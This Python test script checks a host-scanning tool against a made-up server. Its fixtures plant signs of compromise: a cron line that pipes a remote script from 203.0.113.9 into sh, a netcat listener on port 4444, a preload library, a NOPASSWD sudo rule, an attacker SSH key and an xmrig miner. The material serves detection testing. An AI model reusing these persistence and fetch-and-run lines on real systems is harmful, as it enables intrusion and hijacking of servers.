#!/usr/bin/env python3
"""The host scan on a made-up server: what it finds, and that it copies no secrets.
   python3 tests/local/checks/hostscan_check.py     (needs only Python; no root, no containers)"""
import base64, json, os, subprocess, sys, tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
SCAN = os.path.join(HERE, "..", "..", "..", "scripts", "host-scan.py")
if not os.path.exists(SCAN):
    SCAN = "/work/scripts/host-scan.py"  # inside the local test container the checks sit in /t
R = tempfile.mkdtemp(prefix="dk-host-")
failed = 0


def put(path, text, link=None):
    full = R + path
    os.makedirs(os.path.dirname(full), exist_ok=True)
    if link:
        os.symlink(link, full)
    else:
        open(full, "w").write(text)


def ok(cond, label, extra=""):
    global failed
    failed += 0 if cond else 1
    print(("PASS  " if cond else "FAIL  ") + label + ("  | " + str(extra) if extra and not cond else ""))


KEY = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519" + b"k" * 36).decode()
put("/etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\ndeploy:x:1000:1000::/home/deploy:/bin/bash\nsupport:x:0:0::/home/support:/bin/sh\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\n")
put("/etc/shadow", "root:$6$SALT$ROOTHASHVALUE:19800:0:99999:7:::\ndaemon:*:19000:0:99999:7:::\ndeploy:$6$SALT$DEPLOYHASHVALUE:19900:0:99999:7:::\nsupport::19950:0:99999:7:::\nwww-data:!:19000::::::\n")
put("/etc/group", "root:x:0:\nsudo:x:27:deploy\ndocker:x:998:deploy,www-data\nusers:x:100:deploy\n")
put("/etc/sudoers", "# comment\nDefaults env_reset\nroot ALL=(ALL:ALL) ALL\n%sudo   ALL=(ALL:ALL) ALL\n@includedir /etc/sudoers.d\n")
put("/etc/sudoers.d/90-support", "support ALL=(ALL) NOPASSWD:ALL\n")
put("/root/.ssh/authorized_keys", "# mine\nssh-ed25519 %s admin@laptop\nfrom=\"10.0.0.1\",command=\"/bin/backup\" ssh-ed25519 %s backup-job\n" % (KEY, base64.b64encode(b"other-key-blob").decode()))
put("/home/deploy/.ssh/authorized_keys", "ssh-ed25519 %s deploy@ci\n" % KEY)
put("/etc/ssh/sshd_config", "Include /etc/ssh/sshd_config.d/*.conf\n#PermitRootLogin prohibit-password\nPasswordAuthentication yes\nPort 22\nPort 2222\nMatch User backup\n  PermitRootLogin yes\n")
put("/etc/ssh/sshd_config.d/50-cloud.conf", "PasswordAuthentication no\n")
put("/etc/crontab", "SHELL=/bin/sh\n# m h dom mon dow user command\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n")
put("/etc/cron.d/backup", "0 3 * * * root mysqldump -uroot -pS3cretPass shop > /backup/shop.sql\n")
put("/var/spool/cron/crontabs/deploy", "MAILTO=\"\"\n*/5 * * * * curl -s http://203.0.113.9/x.sh?token=abc123 | sh\n@reboot /home/deploy/.cache/kworker --password=hunter2\n")
put("/etc/cron.daily/logrotate", "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n")
put("/etc/systemd/system/shop.service", "[Unit]\nDescription=Shop\n[Service]\nUser=deploy\nExecStart=/usr/bin/node /srv/shop/server.js\nEnvironment=API_KEY=abcdef\n[Install]\nWantedBy=multi-user.target\n")
put("/etc/systemd/system/multi-user.target.wants/shop.service", "", link="/etc/systemd/system/shop.service")
put("/etc/systemd/system/sshd.service", "", link="/usr/lib/systemd/system/ssh.service")
put("/etc/systemd/system/masked.service", "", link="/dev/null")
put("/usr/lib/systemd/system/ssh.service", "[Service]\nExecStart=/usr/sbin/sshd -D\n")
put("/usr/lib/systemd/system/apt-daily.timer", "[Timer]\nOnCalendar=*-*-* 6,18:00\n")
put("/home/deploy/.config/systemd/user/sync.service", "[Service]\nExecStart=/dev/shm/.x/sync --token=tok_live_99\n")
put("/etc/rc.local", "#!/bin/sh\nexit 0\n")
put("/etc/ld.so.preload", "/usr/local/lib/libhide.so\n")
put("/root/.bashrc", "export DB_PASSWORD=rootsecret\n")
put("/tmp-ss", 'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=700,fd=3))\ntcp LISTEN 0 128 [::]:22 [::]:* users:(("sshd",pid=700,fd=4))\ntcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* users:(("mysqld",pid=1200,fd=22))\nudp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* users:(("systemd-resolve",pid=500,fd=13))\ntcp LISTEN 0 5 *:4444 *:* users:(("nc",pid=6666,fd=3))\n')

raw = subprocess.run([sys.executable, SCAN, "--root", R, "--ss-file", R + "/tmp-ss", "--out", "-"], stdout=subprocess.PIPE, check=True).stdout.decode()
rep = json.loads(raw)
by = {i["key"]: i for i in rep["items"]}
keys = lambda prefix: sorted(k for k in by if k.startswith(prefix))

ok(rep["version"] == 1 and rep["generatedAt"].endswith("Z") and len(rep["items"]) > 25, "the report is JSON with a time and a list of items")
ok(len(keys("user:")) == 5 and by["user:deploy"]["detail"]["login"] and not by["user:daemon"]["detail"]["login"], "every account is listed, with whether it can sign in")
ok(by["user:support"]["detail"]["emptyPassword"] and by["user:deploy"]["detail"]["hasPassword"] and not by["user:www-data"]["detail"]["hasPassword"], "an account with an empty password is marked; a locked one has none")
ok(by["user:deploy"]["detail"]["passwordChanged"] == "2024-06-26", "the day a password was last changed is kept", by["user:deploy"]["detail"]["passwordChanged"])
ok("admin:support:uid 0" in by and "admin:deploy:group sudo" in by and "admin:www-data:group docker" in by and "admin:root:uid 0" not in by, "admin rights: a second user id 0, sudo and docker group members", keys("admin:"))
ok(sum(1 for k in by if k.startswith("sudo:")) == 3 and any(i["detail"].get("rule") == "support ALL=(ALL) NOPASSWD:ALL" for i in by.values()), "sudo rules are listed line by line, comments and defaults left out", keys("sudo:"))
rk = [by[k] for k in keys("key:root:")]
ok(len(rk) == 2 and all(i["detail"]["fingerprint"].startswith("SHA256:") for i in rk) and sum(i["detail"]["restricted"] for i in rk) == 1, "root's SSH keys are listed by fingerprint, and a restricted key is marked")
ok(len(keys("key:deploy:")) == 1 and keys("key:deploy:")[0].split(":", 2)[2] == [k for k in keys("key:root:") if by[k]["detail"]["comment"] == "admin@laptop"][0].split(":", 2)[2], "the same key on two users has the same fingerprint")
ok(by["sshd:PasswordAuthentication"]["detail"]["value"] == "no" and by["sshd:PermitRootLogin"]["detail"]["value"] == "prohibit-password" and by["sshd:Port"]["detail"]["value"] == "22 2222", "SSH settings: an included file wins, defaults are filled in, a Match block is ignored", {k: by[k]["detail"]["value"] for k in keys("sshd:")})
crons = [by[k]["detail"] for k in keys("cron:")]
ok(len(crons) == 4 and {c["user"] for c in crons} == {"root", "deploy"} and any(c["schedule"] == "@reboot" for c in crons), "cron lines from the system files and each user's own, variables left out", [(c["user"], c["schedule"]) for c in crons])
ok("cronfile:/etc/cron.daily/logrotate" in by, "scripts in the daily folder are listed")
ok(by["unit:shop.service"]["detail"]["enabled"] and by["unit:shop.service"]["detail"]["origin"] == "admin" and by["unit:ssh.service"]["detail"]["origin"] == "package" and not by["unit:ssh.service"]["detail"]["enabled"], "services: where they come from and whether they start at boot")
ok("unit:sshd.service" not in by and "unit:masked.service" not in by and by["unit:apt-daily.timer"]["detail"]["timer"], "other names for a unit and masked units are left out; timers are in", keys("unit:"))
ok(by["unit:~deploy/sync.service"]["detail"]["origin"] == "home" and by["unit:~deploy/sync.service"]["detail"]["runs"].startswith("/dev/shm/.x/sync"), "a service in a user's own folder is found")
ok(by["startup:/etc/ld.so.preload"]["detail"]["loads"] == ["/usr/local/lib/libhide.so"] and "startup:/root/.bashrc" in by and "startup:/etc/rc.local" in by, "startup files: the preload list, rc.local, shell start files")
ok(by["port:tcp:22"]["detail"]["public"] and by["port:tcp:22"]["detail"]["program"] == "sshd" and not by["port:tcp:3306"]["detail"]["public"] and by["port:tcp:4444"]["detail"]["program"] == "nc" and not by["port:udp:53"]["detail"]["public"], "listening ports: the program, and whether the port is open to the outside")
secrets = ["ROOTHASHVALUE", "DEPLOYHASHVALUE", "S3cretPass", "abc123", "hunter2", "tok_live_99", "rootsecret", "abcdef", KEY]
ok(not [s for s in secrets if s in raw], "no password hash, key, token or password from a command line is in the report", [s for s in secrets if s in raw])
ok("mysqldump -uroot -p*** shop" in raw and "token=***" in raw and "--password=***" in raw, "they are blanked, and the rest of the command stays readable")
again = json.loads(subprocess.run([sys.executable, SCAN, "--root", R, "--ss-file", R + "/tmp-ss"], stdout=subprocess.PIPE).stdout.decode())
ok({i["key"]: i["fp"] for i in again["items"]} == {i["key"]: i["fp"] for i in rep["items"]}, "two scans of an unchanged server give the same checksums")
open(R + "/home/deploy/.ssh/authorized_keys", "a").write("ssh-ed25519 %s attacker\n" % base64.b64encode(b"attacker-key").decode())
open(R + "/etc/systemd/system/shop.service", "a").write("ExecStartPost=/tmp/.hidden\n")
third = {i["key"]: i["fp"] for i in json.loads(subprocess.run([sys.executable, SCAN, "--root", R, "--ss-file", R + "/tmp-ss"], stdout=subprocess.PIPE).stdout.decode())["items"]}
first = {i["key"]: i["fp"] for i in rep["items"]}
ok(sorted(set(third) - set(first)) == [k for k in third if k.startswith("key:deploy:") and k not in first] and len(set(third) - set(first)) == 1, "a key added later shows up as one new item")
ok([k for k in first if third.get(k) != first[k]] == ["unit:shop.service"], "an edited service file shows up as one changed item", [k for k in first if third.get(k) != first[k]])
out = R + "/out/inventory.json"
subprocess.run([sys.executable, SCAN, "--root", R, "--ss-file", R + "/tmp-ss", "--out", out], check=True)
ok(json.load(open(out))["version"] == 1 and not os.path.exists(out + ".tmp"), "written to a file in one step, with no half-written copy left")

# ── running programs, outgoing connections, containers ──────────────────────
P = tempfile.mkdtemp(prefix="dk-proc-")


def proc(pid, comm, cmd, exe=None, uid="0", ticks=100, start="5000", cgroup="0::/system.slice/x.service\n"):
    base = P + "/proc/%d" % pid
    os.makedirs(base, exist_ok=True)
    # field 14 and 15 are user and system CPU ticks, field 22 the start time
    fields = ["S", "1"] + ["0"] * 9 + [str(ticks), "0"] + ["0"] * 6 + [start]
    open(base + "/stat", "w").write("%d (%s) %s\n" % (pid, comm, " ".join(fields)))
    open(base + "/cmdline", "w").write(cmd.replace(" ", "\x00") + ("\x00" if cmd else ""))
    open(base + "/status", "w").write("Name:\t%s\nUid:\t%s\t%s\t%s\t%s\n" % (comm, uid, uid, uid, uid))
    open(base + "/cgroup", "w").write(cgroup)
    if exe:
        if os.path.lexists(base + "/exe"):
            os.remove(base + "/exe")
        os.symlink(exe, base + "/exe")


def pput(path, text):
    os.makedirs(os.path.dirname(P + path), exist_ok=True)
    open(P + path, "w").write(text)


pput("/etc/passwd", "root:x:0:0::/root:/bin/bash\ndeploy:x:1000:1000::/home/deploy:/bin/bash\n")
pput("/proc/uptime", "10000.00 9000.00\n")
pput("/usr/sbin/nginx", "new copy after an update")
CID = "ab" * 32
proc(1, "systemd", "/sbin/init", "/usr/lib/systemd/systemd")
proc(2, "kthreadd", "")                                     # a real kernel thread: no command, no program file
proc(700, "sshd", "/usr/sbin/sshd -D", "/usr/sbin/sshd")
proc(4242, "kworkerd", "/tmp/.x/kworkerd", "/tmp/.x/kworkerd", uid="1000")
proc(4243, "kworkerd", "/tmp/.x/kworkerd", "/tmp/.x/kworkerd", uid="1000")
proc(4300, "perl", "[kworker/0:2]", "/usr/bin/perl")
proc(4400, "bot", "/root/.x/bot", "/root/.x/bot (deleted)")
proc(4500, "nginx", "nginx: worker process", "/usr/sbin/nginx (deleted)")
proc(4600, "sync", "/home/deploy/.cache/sync --token=tok_9", "/home/deploy/.cache/sync", uid="1000")
proc(4700, "node", "/home/deploy/.nvm/versions/node/v20/bin/node app.js", "/home/deploy/.nvm/versions/node/v20/bin/node", uid="1000")
proc(4800, "xmrig", "./xmrig -o pool.example:3333", "/opt/xm/xmrig")
proc(4900, "node", "node server.js", "/usr/local/bin/node", cgroup="0::/system.slice/docker-%s.scope\n" % CID)
proc(5000, "grep", "grep -r xmrig --donate-level /var/www", "/usr/bin/grep")
proc(5100, "ffmpeg", "ffmpeg -i in.mp4 out.webm", "/usr/bin/ffmpeg", ticks=1000, start="9000")
proc(5200, "python3", "python3 job.py", "/usr/bin/python3", ticks=1000, start="9100")
open(P + "/ss-conn", "w").write(
    'ESTAB 0 0 10.0.0.5:51234 198.51.100.7:3333 users:(("kworkerd",pid=4242,fd=5))\n'
    'ESTAB 0 0 10.0.0.5:51235 203.0.113.20:6667 users:(("perl",pid=4300,fd=3))\n'
    'ESTAB 0 0 10.0.0.5:51236 140.82.112.3:443 users:(("git",pid=6000,fd=3))\n'
    'ESTAB 0 0 10.0.0.5:51237 10.0.0.9:3333 users:(("app",pid=6100,fd=3))\n'
    'ESTAB 0 0 10.0.0.5:51238 198.51.100.7:3333 users:(("kworkerd",pid=4243,fd=5))\n')
json.dump([
    {"Id": CID, "Name": "/dbbkp-site-aaaaaaaa-11112222", "Config": {"Image": "dbbkp-site-aaaaaaaa:d5", "Labels": {"dbbkp.site": "aaaaaaaa-0000-4000-8000-000000000001"}}, "HostConfig": {"NetworkMode": "dbbkp"}, "State": {"Running": True}, "Mounts": []},
    {"Id": "c" * 64, "Name": "/dbbkp-api", "Config": {"Image": "ghcr.io/dbbkp/api:latest", "Labels": {}}, "HostConfig": {}, "State": {"Running": True}, "Mounts": [{"Source": "/var/run/docker.sock"}]},
    {"Id": "d" * 64, "Name": "/helper", "Config": {"Image": "alpine", "Labels": {}}, "HostConfig": {"Privileged": True, "PidMode": "host", "RestartPolicy": {"Name": "always"}}, "State": {"Running": True}, "Mounts": [{"Source": "/"}]},
    {"Id": "e" * 64, "Name": "/blog", "Config": {"Image": "ghost:5", "Labels": {}}, "HostConfig": {"NetworkMode": "bridge"}, "State": {"Running": False}, "Mounts": [{"Name": "blog-data", "Source": "/var/lib/docker/volumes/blog-data/_data"}]},
], open(P + "/containers.json", "w"))
args = [sys.executable, SCAN, "--root", P, "--ss-file", R + "/tmp-ss", "--ss-conn-file", P + "/ss-conn", "--containers-file", P + "/containers.json", "--state", P + "/cpu.json"]
r1 = json.loads(subprocess.run(args, stdout=subprocess.PIPE, check=True).stdout.decode())
b1 = {i["key"]: i for i in r1["items"]}
pr = {k: v["detail"] for k, v in b1.items() if v["kind"] == "process"}
ok({"process", "outbound", "container"} <= set(r1["scanned"]), "the report says which kinds were read", r1["scanned"])
ok(pr.get("proc:/tmp/.x/kworkerd", {}).get("signs") == ["temp"] and pr["proc:/tmp/.x/kworkerd"]["count"] == 2 and pr["proc:/tmp/.x/kworkerd"]["user"] == "deploy", "a program running from a temporary folder is listed once, with how many copies and whose", pr.get("proc:/tmp/.x/kworkerd"))
ok("fake-kernel" in pr.get("proc:/usr/bin/perl", {}).get("signs", []), "a program named like a kernel thread is caught")
ok(pr.get("proc:/root/.x/bot", {}).get("signs") == ["deleted"] and pr.get("proc:/usr/sbin/nginx", {}).get("signs") == ["old-copy"], "a program that deleted its own file is caught; an old copy after an update is told apart", (pr.get("proc:/root/.x/bot"), pr.get("proc:/usr/sbin/nginx")))
ok(pr.get("proc:/home/deploy/.cache/sync", {}).get("signs") == ["hidden"] and "proc:/home/deploy/.nvm/versions/node/v20/bin/node" not in pr, "a program in a hidden home folder is listed; one in a known tool folder is not")
ok(pr.get("proc:/opt/xm/xmrig", {}).get("signs") == ["miner"], "a miner is caught by its name")
ok("proc:/usr/bin/grep" not in pr and "proc:/usr/sbin/sshd" not in pr and "proc:/usr/local/bin/node" not in pr and not any(k.startswith("cpu:") for k in pr), "ordinary programs, someone searching for a miner's name, and the first CPU reading raise nothing", sorted(pr))
ok("tok_9" not in json.dumps(r1), "a token in a running command line is blanked too")
out = {k: v["detail"] for k, v in b1.items() if v["kind"] == "outbound"}
ok(sorted(out) == ["out:198.51.100.7:3333", "out:203.0.113.20:6667"] and out["out:198.51.100.7:3333"]["kind"] == "pool" and out["out:198.51.100.7:3333"]["program"] == "kworkerd", "connections to a mining-pool port and a chat-control port are listed; web traffic and private addresses are not", sorted(out))
co = {k: v["detail"] for k, v in b1.items() if v["kind"] == "container"}
ok(sorted(co) == ["container:app:aaaaaaaa-0000-4000-8000-000000000001", "container:blog", "container:dbbkp-api", "container:helper"], "every container is listed; the panel's own apps by app, not by deploy", sorted(co))
ok(co["container:helper"]["privileged"] and co["container:helper"]["hostPid"] and co["container:helper"]["riskyMounts"] == ["/"] and co["container:dbbkp-api"]["riskyMounts"] == ["/var/run/docker.sock"] and co["container:blog"]["riskyMounts"] == [], "full access, the host's processes, the host's disk and the Docker socket are marked")
# second reading, five minutes later: ffmpeg used 90% of a core, python 30%
pput("/proc/uptime", "10300.00 9100.00\n")
proc(5100, "ffmpeg", "ffmpeg -i in.mp4 out.webm", "/usr/bin/ffmpeg", ticks=1000 + 27000, start="9000")
proc(5200, "python3", "python3 job.py", "/usr/bin/python3", ticks=1000 + 9000, start="9100")
r2 = {i["key"]: i["detail"] for i in json.loads(subprocess.run(args, stdout=subprocess.PIPE, check=True).stdout.decode())["items"]}
ok(r2.get("cpu:/usr/bin/ffmpeg", {}).get("cpuPct") == 90 and r2["cpu:/usr/bin/ffmpeg"]["minutes"] == 5 and "cpu:/usr/bin/python3" not in r2, "a program that kept a whole core busy for five minutes is listed; a moderately busy one is not", r2.get("cpu:/usr/bin/ffmpeg"))
proc(5100, "ffmpeg", "ffmpeg -i in.mp4 out.webm", "/usr/bin/ffmpeg", ticks=1000 + 27000 + 500, start="9999")
pput("/proc/uptime", "10600.00 9200.00\n")
r3 = {i["key"] for i in json.loads(subprocess.run(args, stdout=subprocess.PIPE, check=True).stdout.decode())["items"]}
ok("cpu:/usr/bin/ffmpeg" not in r3, "a new program that reuses an old process number is not mistaken for the busy one")
print("%d FAILED" % failed if failed else "host scan holds")
sys.exit(1 if failed else 0)
